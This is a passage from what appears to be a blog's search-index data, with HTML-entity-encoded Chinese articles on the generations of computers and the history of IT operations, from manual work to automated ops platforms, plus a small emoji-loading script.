&#x4E09;&#x4EE3;&#x8BA1;&#x7B97;&#x7684;&#x7279;&#x70B9;&#xFF1A;&#x7528;&#x5C0F;&#x89C4;&#x6A21;&#xFF08;100&#x4EE5;&#x4E0B;&#x5143;&#x4EF6;&#xFF09;&#x6216;&#x4E2D;&#x89C4;&#x6A21;&#xFF08;100-1000&#x5143;&#x4EF6;&#xFF09;&#x7684;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#x6765;&#x4EE3;&#x66FF;&#x6676;&#x4F53;&#x7BA1;&#x7B49;&#x5206;&#x7ACB;&#x5143;&#x4EF6;&#xFF1B;&#x7528;&#x534A;&#x5BFC;&#x4F53;&#x5B58;&#x50A8;&#x5668;&#x4EE3;&#x66FF;&#x78C1;&#x5FC3;&#x5B58;&#x50A8;&#x5668;&#xFF1B;&#x4F7F;&#x7528;&#x5FAE;&#x7A0B;&#x5E8F;&#x8BBE;&#x8BA1;&#x6280;&#x672F;&#x7B80;&#x5316;&#x5904;&#x7406;&#x673A;&#x7684;&#x7ED3;&#x6784;&#xFF1B;&#x5728;&#x8F6F;&#x4EF6;&#x65B9;&#x9762;&#x5E7F;&#x6CDB;&#x5F15;&#x5165;&#x591A;&#x9053;&#x7A0B;&#x5E8F;&#x3001;&#x5E76;&#x884C;&#x5904;&#x7406;&#x3001;&#x865A;&#x62DF;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x4EE5;&#x53CA;&#x529F;&#x80FD;&#x5B8C;&#x5907;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x63D0;&#x4F9B;&#x4E86;&#x5927;&#x91CF;&#x9762;&#x5411;&#x7528;&#x6237;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x3002; 4&#xFF1A;&#x7B2C;&#x56DB;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#xFF08;1972&#x5E74;&#x81F3;&#x4ECA;&#xFF09; &#x5FAE;&#x578B;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x8BDE;&#x751F;&#x662F;&#x8D85;&#x5927;&#x89C4;&#x6A21;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#x5E94;&#x7528;&#x7684;&#x76F4;&#x63A5;&#x7ED3;&#x679C;&#xFF0C;1975&#x5E74;&#x7B2C;&#x4E00;&#x53F0;&#x5546;&#x4E1A;&#x5316;&#x7684;&#x5FAE;&#x578B;&#x8BA1;&#x7B97;&#x673A; MITS Altair &#x95EE;&#x4E16;&#xFF0C;&#x5B83;&#x4F7F;&#x7528;&#x4E86;Intel&#x516C;&#x53F8;&#x7684;8080&#x82AF;&#x7247;&#xFF1B; &#x65F6;&#x81F3;&#x4ECA;&#x65E5;&#xFF0C;&#x5954;&#x817E;&#x7CFB;&#x5217;&#x5FAE;&#x5904;&#x7406;&#x5668;&#x5E94;&#x8FD0;&#x800C;&#x751F;&#xFF0C;&#x73B0;&#x5728;&#x5FAE;&#x578B;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x4F53;&#x79EF;&#x8D8A;&#x6765;&#x8D8A;&#x5C0F;&#x3001;&#x6027;&#x80FD;&#x8D8A;&#x6765;&#x5F3A;&#x3001;&#x53EF;&#x9760;&#x6027;&#x8D8A;&#x6765;&#x8D8A;&#x9AD8;&#x3001;&#x4EF7;&#x683C;&#x8D8A;&#x6765;&#x8D8A;&#x4F4E;&#x3001;&#x5E94;&#x7528;&#x8303;&#x56F4;&#x8D8A;&#x6765;&#x8D8A;&#x5E7F;&#xFF0C;&#x52A0;&#x4E0A;&#x5B8C;&#x5584;&#x7684;&#x7CFB;&#x7EDF;&#x8F6F;&#x4EF6;&#x3001;&#x4E30;&#x5BCC;&#x7684;&#x7CFB;&#x7EDF;&#x5F00;&#x53D1;&#x5DE5;&#x5177;&#x548C;&#x5546;&#x54C1;&#x5316;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x5927;&#x91CF;&#x6D8C;&#x73B0;&#xFF0C;&#x901A;&#x4FE1;&#x6280;&#x672F;&#x548C;&#x8BA1;&#x7B97;&#x673A;&#x7F51;&#x7EDC;&#x7684;&#x98DE;&#x901F;&#x53D1;&#x5C55;&#xFF0C;&#x4F7F;&#x5F97;&#x8BA1;&#x7B97;&#x673A;&#x8FDB;&#x5165;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x53D1;&#x5C55;&#x7684;&#x9636;&#x6BB5;&#x3002; &#x7B2C;&#x56DB;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x6700;&#x4E3A;&#x663E;&#x8457;&#x7684;&#x7279;&#x5F81;&#x5C31;&#x662F;&#x4F7F;&#x7528;&#x4E86;&#x5927;&#x89C4;&#x6A21;&#xFF08;1000-10000&#xFF09;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#x548C;&#x8D85;&#x5927;&#x89C4;&#x6A21;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#xFF08;10000&#x4EE5;&#x4E0A;&#xFF09;&#xFF1B;&#x4F7F;&#x7528;&#x5927;&#x5BB9;&#x91CF;&#x7684;&#x534A;&#x5BFC;&#x4F53;&#x4F5C;&#x4E3A;&#x5185;&#x5B58;&#x50A8;&#x5668;&#xFF1B;&#x5728;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;&#x65B9;&#x9762;&#x8FDB;&#x4E00;&#x6B65;&#x53D1;&#x5C55;&#x4E86;&#x5E76;&#x884C;&#x5904;&#x7406;&#x3001;&#x591A;&#x673A;&#x7CFB;&#x7EDF;&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x548C;&#x8BA1;&#x7B97;&#x673A;&#x7F51;&#x7EDC;&#x7CFB;&#x7EDF;&#xFF1B;&#x5728;&#x8F6F;&#x4EF6;&#x65B9;&#x9762;&#x63A8;&#x51FA;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4EE5;&#x53CA;&#x8F6F;&#x4EF6;&#x5DE5;&#x7A0B;&#x6807;&#x51C6;&#x7B49;&#x3002; 5&#xFF1A;&#x7B2C;&#x4E94;&#x4EE3;&#x8BA1;&#x7B97;&#x673A; &#x4E94;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x5C1A;&#x5728;&#x7814;&#x5236;&#x4E4B;&#x4E2D;&#xFF0C;&#x7814;&#x7A76;&#x76EE;&#x6807;&#x662F;&#x8BD5;&#x56FE;&#x6253;&#x7834;&#x8BA1;&#x7B97;&#x673A;&#x73B0;&#x6709;&#x7684;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;&#xFF0C;&#x4F7F;&#x5F97;&#x8BA1;&#x7B97;&#x673A;&#x80FD;&#x591F;&#x5177;&#x6709;&#x50CF;&#x4EBA;&#x90A3;&#x6837;&#x7684;&#x601D;&#x7EF4;&#x3001;&#x63A8;&#x7406;&#x548C;&#x5224;&#x65AD;&#x80FD;&#x529B;&#xFF08;&#x4EBA;&#x5DE5;&#x667A;&#x80FD;&#xFF09;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"运维发展史","date":"2020-09-26T12:35:45.000Z","path":"/posts/dded0e80/","text":"&#x8FD0;&#x7EF4;&#x5C97;&#x4F4D;&#x5386;&#x53F2;&#x60A0;&#x4E45;&#x63D0;&#x5230;&#x8FD0;&#x7EF4;&#x5F88;&#x591A;&#x4EBA;&#x53EF;&#x80FD;&#x60F3;&#x5230; IT&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x7EF4;&#xFF0C;&#x5176;&#x5B9E;&#x8FD0;&#x7EF4;&#x5C97;&#x4F4D;&#x4E0D;&#x4EC5;&#x4EC5;&#x6700;&#x8FD1;&#x51E0;&#x5341;&#x5E74;&#x624D;&#x6709;&#x7684;&#x5DE5;&#x4F5C;&#x5C97;&#x4F4D;&#xFF0C;&#x5927;&#x591A;&#x8FD0;&#x7EF4;&#x7684;&#x7406;&#x5FF5;&#x90FD;&#x6765;&#x81EA;&#x4EBA;&#x7C7B;&#x533B;&#x7597;&#x754C;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x533B;&#x751F;&#x662F;&#x5BF9;&#x4EBA;&#x4F53;&#x8FD9;&#x4E2A;&#x8D85;&#x7EA7;&#x590D;&#x6742;&#x7CFB;&#x7EDF;&#x505A;&#x8FD0;&#x7EF4;&#xFF0C;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x8FD0;&#x7EF4;&#x7684;&#x662F;IT&#x7CFB;&#x7EDF;&#x800C;&#x5DF2;&#x3002;&#x533B;&#x751F;&#x901A;&#x8FC7;&#x5BF9;&#x751F;&#x547D;&#x4EE5;&#x53CA;&#x751F;&#x6D3B;&#x7684;&#x5404;&#x79CD;&#x89C2;&#x5BDF;&#x4E0E;&#x8861;&#x91CF;&#x6765;&#x7EF4;&#x62A4;&#x751F;&#x547D;&#x7684;&#x6B63;&#x5E38;&#x72B6;&#x6001;&#x4E0E;&#x8FD0;&#x884C;&#xFF1B;&#x800C;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#xFF1A;&#x901A;&#x8FC7;&#x5BF9;&#x7CFB;&#x7EDF;&#x8FD0;&#x884C;&#x7684;&#x5404;&#x79CD;&#x89C2;&#x5BDF;&#x4E0E;&#x8861;&#x91CF;&#x6765;&#x7EF4;&#x62A4;&#x7CFB;&#x7EDF;&#x7684;&#x6B63;&#x5E38;&#x72B6;&#x6001;&#x4E0E;&#x8FD0;&#x884C;&#xFF0C;&#x5982;&#x533B;&#x751F;&#x901A;&#x8FC7;&#x8840;&#x5E38;&#x89C4;&#x3001;&#x5C3F;&#x68C0;&#x7B49;&#x7B49;&#x89C2;&#x6D4B;&#x6307;&#x6807;&#x518D;&#x6839;&#x636E;&#x5386;&#x53F2;&#x7ECF;&#x9A8C;&#x6765;&#x8BC4;&#x4F30;&#x4E00;&#x4E2A;&#x4EBA;&#x7684;&#x8EAB;&#x4F53;&#x72B6;&#x6001;&#xFF0C;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x901A;&#x8FC7;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6307;&#x6807;KPI&#x53D8;&#x5316;&#x3001;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x7684;&#x6839;&#x636E;&#x7ECF;&#x9A8C;&#x627E;&#x56E0;&#x679C;&#x5173;&#x7CFB;&#x6765;&#x5B9A;&#x754C;&#x5B9A;&#x4F4D;&#x6545;&#x969C;&#xFF1B;&#x518D;&#x5982;&#x533B;&#x751F;&#x901A;&#x8FC7;X&#x5C04;&#x7EBF;&#x62CD;CT&#x3001;&#x62CD;&#x80F8;&#x7247;&#x6765;&#x900F;&#x89C6;&#x4EBA;&#x4F53;&#x8FDB;&#x4E00;&#x6B65;&#x89C2;&#x6D4B;&#x4EBA;&#x4F53;&#x7EC6;&#x5FAE;&#x53D8;&#x5316;&#x6765;&#x63A8;&#x65AD;&#x75C5;&#x56E0;&#xFF0C;&#x800C;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x5219;&#x4F1A;&#x628A;&#x6545;&#x969C;&#x5355;&#x5143;suspend&#x4F4F;&#xFF0C;&#x653E;&#x8BCA;&#x65AD;&#x5668;&#x8FDB;&#x884C;&#x8BCA;&#x65AD;&#xFF0C;&#x626B;&#x63CF;&#x5185;&#x5B58;&#x5806;&#x6808;&#x7B49;&#x6545;&#x969C;&#x73B0;&#x573A;&#x4FE1;&#x606F;&#x63A8;&#x5230;&#x51FA;&#x6545;&#x969C;&#x6839;&#x56E0;&#x7B49;&#x7B49;&#xFF0C;&#x5F88;&#x591A;&#x8FD0;&#x7EF4;&#x7406;&#x5FF5;&#x6765;&#x81F3;&#x533B;&#x5B66;&#x754C;&#x3002;&#x4F34;&#x968F;&#x79D1;&#x6280;&#x7684;&#x53D1;&#x5C55;&#x533B;&#x7597;&#x8BCA;&#x65AD;&#x624B;&#x6BB5;&#x5728;&#x4E0D;&#x65AD;&#x6F14;&#x8FDB;&#xFF0C;&#x4E0E;&#x533B;&#x7597;&#x754C;&#x4E00;&#x6837;&#x8FD0;&#x7EF4;&#x4E5F;&#x6709;&#x5176;&#x53D1;&#x5C55;&#x5386;&#x7A0B;&#x3002; IT&#x8FD0;&#x7EF4;&#x7684;&#x53D1;&#x5C55;&#x5386;&#x7A0B;&#x4E8B;&#x7269;&#x7684;&#x53D1;&#x5C55;&#x4E0D;&#x662F;&#x5B64;&#x7ACB;&#x7684;&#xFF0C;&#x8FD0;&#x7EF4;&#x4E5F;&#x4E0D;&#x4F8B;&#x5916;&#xFF0C;&#x5B83;&#x4E0E;&#x4E1A;&#x754C;&#x7684;&#x6574;&#x4E2A;&#x6280;&#x672F;&#x8D8B;&#x52BF;&#x53D1;&#x5C55;&#x662F;&#x76F8;&#x8F85;&#x76F8;&#x6210;&#x7684;&#x3002;&#x8FD9;&#x5C31;&#x8981;&#x6C42;&#x6211;&#x4EEC;&#x5173;&#x6CE8;&#x8FD0;&#x7EF4;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x4E5F;&#x8981;&#x5173;&#x6CE8;&#x6574;&#x4E2A;&#x6280;&#x672F;&#x8D8B;&#x52BF;&#x548C;&#x80CC;&#x666F;&#x6765;&#x8BF4;&#x8FD0;&#x7EF4;&#x53D1;&#x5C55;&#x5386;&#x7A0B;&#xFF1B;&#x4ECE;&#x4E0D;&#x540C;&#x7EF4;&#x5EA6;&#x5BF9;&#x7CFB;&#x7EDF;&#x8FD0;&#x7EF4;&#x5386;&#x7A0B;&#x8FDB;&#x884C;&#x603B;&#x7ED3;&#xFF0C;&#x5982;&#x6309;&#x4EBA;&#x5DE5;&#x5E72;&#x9884;&#x7A0B;&#x5EA6;&#x7EF4;&#x5EA6;&#x53EF;&#x628A;&#x8FD0;&#x7EF4;&#x53D1;&#x5C55;&#x7C97;&#x7565;&#x5206;&#x4E3A;&#xFF1A;&#x624B;&#x52A8;&#x8FD0;&#x7EF4;-&gt;&#x81EA;&#x52A8;&#x8FD0;&#x7EF4;-&gt;DevOps-&gt;&#x667A;&#x80FD;&#x8FD0;&#x7EF4;&#xFF1B;&#x5176;&#x4E2D;&#x5728;&#x8FD0;&#x7EF4;&#x53D1;&#x5C55;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6700;&#x65E9;&#x51FA;&#x73B0;&#x7684;&#x662F;&#x624B;&#x5DE5;&#x8FD0;&#x7EF4;&#xFF1B;&#x5728;&#x5927;&#x91CF;&#x7684;&#x81EA;&#x52A8;&#x5316;&#x811A;&#x672C;&#x4EA7;&#x751F;&#x540E;&#xFF0C;&#x5C31;&#x6709;&#x4E86;&#x81EA;&#x52A8;&#x5316;&#x7684;&#x8FD0;&#x7EF4;&#xFF1B;&#x540E;&#x6765;&#x968F;&#x7740;&#x5FAE;&#x670D;&#x52A1;&#x3001;&#x5BB9;&#x5668;&#x6280;&#x672F;&#x5174;&#x8D77;&#x53C8;&#x51FA;&#x73B0;&#x4E86;DevOps&#xFF1B;&#x6700;&#x8FD1;&#x4E00;&#x4E24;&#x5E74;&#x968F;&#x6570;&#x636E;&#x79EF;&#x7D2F;&#x3001;&#x8BA1;&#x7B97;&#x673A;&#x7B97;&#x529B;&#x63D0;&#x5347;&#x53C8;&#x51FA;&#x73B0;&#x667A;&#x80FD;&#x8FD0;&#x7EF4;&#x3002;&#x672C;&#x6587;&#x91CD;&#x70B9;&#x4ECE;&#x53E6;&#x5916;&#x4E00;&#x79CD;&#x7EF4;&#x5EA6;&#x8FD0;&#x7EF4;&#x6280;&#x672F;&#x548C;&#x4EBA;&#x5DE5;&#x5E72;&#x9884;&#x7EC6;&#x7C92;&#x5EA6;&#x5212;&#x5206;&#x8FD0;&#x7EF4;&#x5386;&#x7A0B;&#xFF1A; &#x7B2C;&#x4E00;&#x4E2A;&#x9636;&#x6BB5;&#xFF0C;&#x4EBA;&#x5DE5;&#x4F5C;&#x574A;&#x9636;&#x6BB5;&#xFF0C;&#x6700;&#x521D;IT&#x7CFB;&#x7EDF;&#x5F53;&#x6211;&#x4EEC;&#x9047;&#x5230;&#x7684;&#x6240;&#x6709;&#x8FD0;&#x7EF4;&#x95EE;&#x9898;&#xFF0C;&#x57FA;&#x672C;&#x9760;&#x4EBA;&#x5DE5;&#x64CD;&#x4F5C;&#x5B8C;&#x6210;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7CFB;&#x7EDF;&#x89C4;&#x6A21;&#x4E0D;&#x5927;&#xFF0C;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#x76F8;&#x5BF9;&#x7B80;&#x5355;&#xFF0C;&#x5927;&#x591A;&#x96C6;&#x4E2D;&#x5728;&#x786C;&#x4EF6;&#x3001;&#x7F51;&#x7EDC;&#x548C;&#x7CFB;&#x7EDF;&#x5C42;&#x9762;&#xFF0C;&#x6240;&#x4EE5;&#x6709;&#x4E00;&#x5B9A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x6216;&#x7F51;&#x7EDC;&#x7EF4;&#x62A4;&#x7ECF;&#x9A8C;&#x7684;&#x4EBA;&#x5C31;&#x53EF;&#x4EE5;&#x641E;&#x5B9A;&#x3002;&#x8FD9;&#x79CD;&#x573A;&#x666F;&#x4E0B;&#x7684;&#x8FD0;&#x7EF4;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x5E38;&#x8BF4;&#x7684; SA&#xFF0C;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#xFF1B;&#x901A;&#x8FC7;&#x96C7;&#x4F63;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x8FD0;&#x7EF4;&#x590D;&#x6742;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#xFF0C;&#x4E00;&#x822C;&#x8EAB;&#x517C;&#x591A;&#x804C;&#xFF0C;&#x4EBA;&#x6570;&#x4E5F;&#x4E0D;&#x592A;&#x591A;&#xFF0C;&#x662F;&#x5F53;&#x65F6;&#x4E1A;&#x754C;&#x6BD4;&#x8F83;&#x666E;&#x904D;&#x7684;&#x505A;&#x6CD5;&#x3002;&#x4F46;&#x968F;&#x7740;&#x7CFB;&#x7EDF;&#x53D8;&#x5F97;&#x8D8A;&#x6765;&#x8D8A;&#x590D;&#x6742;&#xFF0C;&#x7EC4;&#x4EF6;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#xFF0C;&#x7528;&#x6237;&#x6D41;&#x7A0B;&#x4E0D;&#x65AD;&#x4E0A;&#x5347;&#xFF0C;&#x9700;&#x8981;&#x516C;&#x53F8;&#x62DB;&#x8058;&#x66F4;&#x591A;&#x7684;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x6765;&#x5E94;&#x5BF9;&#x65E5;&#x76CA;&#x589E;&#x591A;&#x4E8B;&#x4EF6;&#x3002;&#x7CFB;&#x7EDF;&#x8FD0;&#x7EF4;&#x6210;&#x672C;&#x4E0D;&#x65AD;&#x589E;&#x52A0;&#x3002; &#x7B2C;&#x4E8C;&#x4E2A;&#x9636;&#x6BB5;&#xFF0C;&#x811A;&#x672C;&#x5DE5;&#x5177;&#x9636;&#x6BB5;&#xFF0C;&#x4E00;&#x822C;&#x7EDD;&#x5927;&#x591A;&#x6570;&#x4F01;&#x4E1A;&#x90FD;&#x4F1A;&#x5F88;&#x5FEB;&#x4ECE;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x8FC7;&#x6E21;&#x5230;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF0C;&#x56E0;&#x4E3A;&#x4E0A;&#x4E00;&#x9636;&#x6BB5;&#x7684;&#x5927;&#x91CF;&#x91CD;&#x590D;&#x7E41;&#x7410;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5B8C;&#x5168;&#x53EF;&#x4EE5;&#x8F6C;&#x5316;&#x4E3A;&#x811A;&#x672C;&#x6765;&#x5B9E;&#x73B0;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6BCF;&#x6B21;&#x90FD;&#x53BB;&#x6572;&#x4E00;&#x5806;&#x7C7B;&#x4F3C;&#x7684;&#x547D;&#x4EE4;&#x3002;&#x65E9;&#x671F;&#x7684; SA &#x4E3B;&#x8981;&#x4EE5;&#x5404;&#x79CD; shell &#x4E3A;&#x4E3B;&#xFF0C;&#x6240;&#x4EE5;&#x5F88;&#x591A; SA &#x5982;&#x679C;&#x4F1A; shell &#x7F16;&#x5199;&#x4E00;&#x4E9B;&#x6279;&#x5904;&#x7406;&#x811A;&#x672C;&#xFF0C;&#x5C31;&#x4F1A;&#x5F88;&#x6709;&#x7ADE;&#x4E89;&#x529B;&#x4E86;&#x3002;&#x518D;&#x5F80;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x5927;&#x5BB6;&#x6240;&#x719F;&#x77E5;&#x7684; Perl&#x3001;Ruby&#x3001;Python &#x7B49;&#x52A8;&#x6001;&#x8BED;&#x8A00;&#x4E5F;&#x88AB;&#x5E7F;&#x6CDB;&#x5E94;&#x7528;&#x4E8E;&#x811A;&#x672C;&#x5DE5;&#x5177;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x4E00;&#x4E9B;&#x903B;&#x8F91;&#x548C;&#x573A;&#x666F;&#x76F8;&#x5BF9;&#x590D;&#x6742;&#x7684;&#x81EA;&#x52A8;&#x5316;&#x5B9E;&#x73B0;&#x3002; &#x7B2C;&#x4E09;&#x4E2A;&#x9636;&#x6BB5;&#xFF0C;&#x6D41;&#x7A0B;&#x548C;&#x5DE5;&#x5177;&#x9636;&#x6BB5;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x628A;&#x4E00;&#x4E9B;&#x590D;&#x6742;&#x7684;&#x64CD;&#x4F5C;&#x5C01;&#x88C5;&#x6210;&#x4E00;&#x4E2A;&#x4E2A;&#x7684;&#x811A;&#x672C;&#x540E;&#xFF0C;&#x6548;&#x7387;&#x786E;&#x5B9E;&#x4F1A;&#x63D0;&#x5347;&#x5F88;&#x591A;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x6240;&#x9762;&#x5BF9;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x548C;&#x4F53;&#x91CF;&#x4E5F;&#x5728;&#x53D8;&#x5F97;&#x66F4;&#x590D;&#x6742;&#x3002;&#x6BD4;&#x5982;&#xFF0C;&#x5BF9;&#x4E8E;&#x8FD0;&#x7EF4;&#x540C;&#x5B66;&#xFF0C;&#x4EE5;&#x524D;&#x5C31;&#x662F;&#x8D1F;&#x8D23;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;&#x4E00;&#x4E0B;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x51E0;&#x5341;&#x53F0;&#x6216;&#x767E;&#x53F0;&#x7684;&#x89C4;&#x6A21;&#xFF0C;&#x811A;&#x672C;&#x6279;&#x91CF;&#x6267;&#x884C;&#x5B8C;&#x5168;&#x53EF;&#x4EE5;&#x641E;&#x5B9A;&#x3002;&#x518D;&#x5F80;&#x540E;&#xFF0C;&#x8FD0;&#x7EF4;&#x8FD8;&#x8981;&#x8D1F;&#x8D23;&#x8F6F;&#x4EF6;&#x7684;&#x9891;&#x7E41;&#x53D1;&#x5E03;&#xFF0C;&#x6BCF;&#x5468;&#x8981;&#x591A;&#x6B21;&#xFF0C;&#x751A;&#x81F3;&#x662F;&#x6BCF;&#x5929;&#x90FD;&#x4F1A;&#x6709;&#xFF0C;&#x8FD9;&#x662F;&#x7531;&#x4E1A;&#x52A1;&#x7279;&#x70B9;&#x51B3;&#x5B9A;&#x7684;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x4E92;&#x8054;&#x7F51;&#x7C7B;&#x578B;&#x7684;&#x4E1A;&#x52A1;&#xFF0C;&#x4E0E;&#x539F;&#x6765;&#x4F20;&#x7EDF;&#x7684;&#x6BCF;&#x4E2A;&#x6708;&#x3001;&#x751A;&#x81F3;&#x51E0;&#x4E2A;&#x6708;&#x53D1;&#x5E03;&#x4E00;&#x6B21;&#x7684;&#x573A;&#x666F;&#x8981;&#x6C42;&#x5B8C;&#x5168;&#x4E0D;&#x4E00;&#x6837;&#x4E86;&#x3002;&#x800C;&#x4E14;&#x968F;&#x7740;&#x7528;&#x6237;&#x4F53;&#x91CF;&#x7684;&#x589E;&#x52A0;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x6570;&#x91CF;&#x53EF;&#x80FD;&#x5DF2;&#x7ECF;&#x5230;&#x4E86;&#x51E0;&#x767E;&#x4E0A;&#x5343;&#x53F0;&#xFF0C;&#x800C;&#x4E14;&#x90E8;&#x7F72;&#x7684;&#x4E1A;&#x52A1;&#x4E5F;&#x4E0D;&#x5C3D;&#x76F8;&#x540C;&#xFF0C;&#x6240;&#x4EE5;&#x5355;&#x7EAF;&#x9760;&#x811A;&#x672C;&#x6267;&#x884C;&#xFF0C;&#x5DF2;&#x7ECF;&#x5B8C;&#x5168;&#x4E0D;&#x80FD;&#x6EE1;&#x8DB3;&#x8981;&#x6C42;&#x3002;&#x8FD9;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x8981;&#x9762;&#x4E34;&#x66F4;&#x52A0;&#x590D;&#x6742;&#x5316;&#x7684;&#x573A;&#x666F;&#x5B9E;&#x73B0;&#xFF0C;&#x6BD4;&#x5982;&#x505A;&#x4E00;&#x6B21;&#x4E1A;&#x52A1;&#x90E8;&#x7F72;&#xFF0C;&#x8FD0;&#x7EF4;&#x540C;&#x5B66;&#x53EF;&#x80FD;&#x8981;&#x5B89;&#x88C5;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x505A;&#x7CFB;&#x7EDF;&#x914D;&#x7F6E;&#x53D8;&#x66F4;&#xFF0C;&#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&#x5305;&#x3001;&#x542F;&#x505C;&#x8FDB;&#x7A0B;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x4E0A;&#x914D;&#x7F6E;&#x670D;&#x52A1;&#x7B49;&#x7B49;&#x3002;&#x8FD9;&#x65F6;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x6D41;&#x7A0B;&#x5C06;&#x4E00;&#x4E2A;&#x4E2A;&#x7684;&#x811A;&#x672C;&#x529F;&#x80FD;&#x4E32;&#x8054;&#x8D77;&#x6765;&#xFF0C;&#x540C;&#x65F6;&#x8FD8;&#x8981;&#x6709;&#x4E00;&#x4E9B;&#x811A;&#x672C;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x6821;&#x9A8C;&#x53CA;&#x5224;&#x65AD;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x540C;&#x65F6;&#x5BF9;&#x4E8E;&#x7535;&#x4FE1;&#x9886;&#x57DF;&#x5BF9;&#x4EA7;&#x54C1;&#x7684;&#x5347;&#x7EA7;&#x53D8;&#x66F4;&#x6709;&#x4E25;&#x683C;&#x7684;&#x64CD;&#x4F5C;&#x89C4;&#x8303;&#x4EE5;&#x53CA;&#x6D41;&#x7A0B;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x8FD9;&#x5C31;&#x5BF9;&#x6D41;&#x7A0B;&#x548C;&#x5DE5;&#x5177;&#x5E73;&#x53F0;&#x6709;&#x4E86;&#x66F4;&#x5927;&#x7684;&#x8BC9;&#x6C42;&#xFF0C; &#x7B2C;&#x56DB;&#x4E2A;&#x9636;&#x6BB5;&#xFF0C;&#x8FD0;&#x7EF4;&#x5E73;&#x53F0;&#x5316;&#x65E2;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x9636;&#x6BB5;&#xFF0C;&#x4E5F;&#x662F;&#x5F53;&#x524D;&#x6240;&#x5904;&#x9636;&#x6BB5;&#xFF1B;&#x968F;&#x7740;&#x8FD0;&#x7EF4;&#x6D41;&#x7A0B;&#x5316;&#x53D1;&#x5C55;&#xFF0C;&#x8F83;&#x5927;IT&#x516C;&#x53F8;&#x8FDB;&#x4E00;&#x6B65;&#x8FDB;&#x884C;&#x8FD0;&#x7EF4;&#x4F53;&#x7CFB;&#x5316;&#x6539;&#x9020;&#x589E;&#x52A0;&#x81EA;&#x52A8;&#x5316;&#x7A0B;&#x5EA6;&#xFF0C;&#x8FD9;&#x5C31;&#x5230;&#x4E86;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x9636;&#x6BB5;&#xFF0C;&#x5927;&#x516C;&#x53F8;&#x9488;&#x5BF9;&#x81EA;&#x5DF1;&#x4E1A;&#x52A1;&#x7279;&#x5F81;&#x6784;&#x7B51;&#x5927;&#x578B;&#x8FD0;&#x7EF4;&#x5E73;&#x53F0; 